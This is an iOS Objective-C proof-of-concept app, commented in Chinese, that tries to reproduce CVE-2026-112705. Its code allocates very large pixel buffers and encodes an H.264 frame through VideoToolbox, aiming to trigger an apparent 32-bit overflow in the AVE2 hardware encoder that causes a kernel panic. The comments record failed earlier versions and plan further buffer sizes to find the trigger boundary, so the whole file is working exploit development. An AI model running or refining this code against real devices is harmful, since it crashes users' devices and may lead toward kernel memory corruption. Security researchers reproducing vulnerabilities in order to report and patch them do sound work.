//
//  vt112705c.m — CVE-2026-112705 复现 v3（压到 1.5 GB buffer）
//
//  v2 的教训（syslog 定案）：
//    memorystatus: exceeded mem limit: ActiveHard 3072 MB (fatal)
//    单进程硬限 3 GB；32768x16384 的 2 GB buffer + 约 1 GB 编码器开销 = 3.15 GB -> 被杀
//    且 CVPixelBufferCreate 是 lazy 分配（phys_footprint 只显 12 MB，实际内核已记账 2 GB）
//
//  v3 策略：把 buffer 压到 1.5 GB，留 1.5 GB 给编码器
//    A) 32768 x 12288    W*H=402,653,184   buffer 1.50 GB   （保持 W=32768 与 PoC 一致）
//    B) 24576 x 16384    W*H=402,653,184   buffer 1.50 GB   （保持 H=16384 与 PoC 一致）
//    两轮之间 sleep 6 秒强制回收
//
//  风险：若触发条件不是 "W>16384" 而是 "W*H >= 2^29"，1.5x2^28 可能还不够
//        -> 那就换 20480x16384 (1.25GB) / 18432x16384 (1.125GB) 继续找边界
//

#import <UIKit/UIKit.h>
#import <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <unistd.h>

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static void L(const char *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    char buf[1024];
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    NSString *s = [NSString stringWithUTF8String:buf];
    if (!s) return;
    NSLog(@"VT112705C %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vt112705c.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_sync(dispatch_get_main_queue(), ^{
        [gLog appendString:line];
        if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightBold];
        }
    });
}

typedef void *VTCompressionSessionRef;
typedef struct { int64_t value; int32_t timescale; uint32_t flags; int64_t epoch; } CMTime;

static const uint32_t CODEC_H264  = 0x61766331;
static const uint32_t PIXFMT_BGRA = 0x42475241;

typedef int32_t (*fn_create_t)(void *, int32_t, int32_t, uint32_t,
                               void *, void *, void *, void *, void *, VTCompressionSessionRef *);
typedef int32_t (*fn_prepare_t)(VTCompressionSessionRef);
typedef int32_t (*fn_encode_t)(VTCompressionSessionRef, CVPixelBufferRef, CMTime, CMTime,
                               void *, void *, void *);
typedef void    (*fn_inv_t)(VTCompressionSessionRef);
typedef int32_t (*fn_pbnew_t)(void *, size_t, size_t, uint32_t, void *, CVPixelBufferRef *);
typedef void    (*fn_pbfree_t)(CVPixelBufferRef);

static fn_create_t  p_create  = NULL;
static fn_prepare_t p_prepare = NULL;
static fn_encode_t  p_encode  = NULL;
static fn_inv_t     p_inv     = NULL;
static fn_pbnew_t   p_pbnew   = NULL;
static fn_pbfree_t  p_pbfree  = NULL;

static const char *st_name(int32_t st)
{
    switch (st) {
        case 0:      return "noErr";
        case -12902: return "kVTParameterErr";
        case -12903: return "kVTInvalidSessionErr";
        case -12904: return "kVTAllocationFailedErr";
        case -12908: return "kVTNotSupportedErr";
        case -6660:  return "kCVInvalidArgument";
        case -6661:  return "kCVInvalidSize";
        case -6662:  return "kCVAllocationFailed";
        case -50:    return "paramErr";
        case -108:   return "memFullErr";
        default:     return "?";
    }
}

static double mem_mb(void)
{
    task_vm_info_data_t info;
    mach_msg_type_number_t cnt = TASK_VM_INFO_COUNT;
    if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&info, &cnt) != KERN_SUCCESS)
        return -1;
    return (double)info.phys_footprint / (1024.0 * 1024.0);
}

static CMTime T_zero(void) { CMTime t = {0,0,0,0}; return t; }

static void attempt(const char *tag, int32_t W, int32_t H)
{
    int64_t px = (int64_t)W * (int64_t)H;
    int64_t bytes = px * 4;
    L("");
    L("========== %s: %d x %d ==========", tag, W, H);
    L("    W*H = %lld (%.3f x 2^28)   buffer = %.2f GB   mem_before = %.0f MB",
      (long long)px, (double)px / 268435456.0, (double)bytes / 1073741824.0, mem_mb());
    SetStatus([NSString stringWithFormat:@"%s %dx%d", tag, W, H]);

    VTCompressionSessionRef s = NULL;
    int32_t st = p_create(NULL, W, H, CODEC_H264, NULL, NULL, NULL, NULL, NULL, &s);
    L("  [1] Create -> %d %s  session=%p   mem=%.0f MB", st, st_name(st), s, mem_mb());
    if (st != 0 || !s) { L("      Create 失败，中止"); return; }

    CVPixelBufferRef pb = NULL;
    L("  [2] PixelBufferCreate %dx%d BGRA (attr=NULL) 需 %.2f GB ...",
      W, H, (double)bytes / 1073741824.0);
    st = p_pbnew(NULL, (size_t)W, (size_t)H, PIXFMT_BGRA, NULL, &pb);
    L("      -> %d %s  pb=%p   mem=%.0f MB（lazy 分配，footprint 不涨是正常的）",
      st, st_name(st), pb, mem_mb());
    if (st != 0 || !pb) {
        L("      buffer 分配失败");
        p_inv(s); CFRelease((CFTypeRef)s);
        return;
    }

    st = p_prepare(s);
    L("  [3] Prepare -> %d %s   mem=%.0f MB", st, st_name(st), mem_mb());

    L("  [4] EncodeFrame ...  <=== 触发行");
    L("      若 AVE2 算 LRB 时 32 位溢出 -> kernel panic");
    CMTime z = T_zero();
    st = p_encode(s, pb, z, z, NULL, NULL, NULL);
    L("      -> %d %s   mem=%.0f MB", st, st_name(st), mem_mb());

    L("  [5] 清理 ...");
    p_pbfree(pb);
    p_inv(s);
    CFRelease((CFTypeRef)s);
    L("      mem_after = %.0f MB", mem_mb());
    L("      本次完成，没有崩溃");
}

static void run(void)
{
    L("===== CVE-2026-112705 v3（1.5 GB buffer 两轮）=====");
    L("uid=%d pid=%d", getuid(), getpid());
    L("v2 教训: 单进程硬限 ActiveHard 3072 MB；2GB buffer + 1GB 编码开销 = 3.15GB 被杀");
    L("v3 策略: 1.5 GB buffer，两轮之间 sleep 6s 强制回收");
    L("");

    void *vt = dlopen("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox", RTLD_NOW);
    void *cv = dlopen("/System/Library/Frameworks/CoreVideo.framework/CoreVideo", RTLD_NOW);
    if (!vt || !cv) { L("dlopen 失败"); SetStatus(@"加载失败"); return; }

    p_create  = (fn_create_t)dlsym(vt, "VTCompressionSessionCreate");
    p_prepare = (fn_prepare_t)dlsym(vt, "VTCompressionSessionPrepareToEncodeFrames");
    p_encode  = (fn_encode_t)dlsym(vt, "VTCompressionSessionEncodeFrame");
    p_inv     = (fn_inv_t)dlsym(vt, "VTCompressionSessionInvalidate");
    p_pbnew   = (fn_pbnew_t)dlsym(cv, "CVPixelBufferCreate");
    p_pbfree  = (fn_pbfree_t)dlsym(cv, "CVPixelBufferRelease");
    if (!p_create || !p_prepare || !p_encode || !p_pbnew) {
        L("dlsym 失败"); SetStatus(@"dlsym 失败"); return;
    }
    L("[ok] dlsym   mem=%.0f MB", mem_mb());

    // ---- A) 32768 x 12288（保持 W=32768，缩 H）----
    attempt("A_W32768_H12288", 32768, 12288);

    L("");
    L("等 6 秒强制回收（让内核释放上一轮的 IOSurface/DART 记账）...");
    SetStatus(@"等待回收...");
    for (int i = 6; i > 0; i--) {
        SetStatus([NSString stringWithFormat:@"回收中 %d", i]);
        sleep(1);
    }
    L("回收后 mem=%.0f MB", mem_mb());

    // ---- B) 24576 x 16384（保持 H=16384，缩 W）----
    attempt("B_W24576_H16384", 24576, 16384);

    L("");
    L("===== 两轮都跑完，没有崩溃 =====");
    L("  => 1.5 GB 配置下没触发");
    L("  => 下一步：20480x16384 (1.25GB) / 18432x16384 (1.125GB) 找边界");
    L("  => 或者 32768x14000 (1.75GB) 往上试（但要注意 3GB 限）");
    SetStatus(@"完成，看日志");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("vt112705c.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 34)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"vt112705 v3...";
    gStatus.textColor = [UIColor colorWithRed:1 green:0.4 blue:0.4 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 90, self.window.bounds.size.width, h - 90)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:9] ?: [UIFont systemFontOfSize:9];
    gView.editable = NO;
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
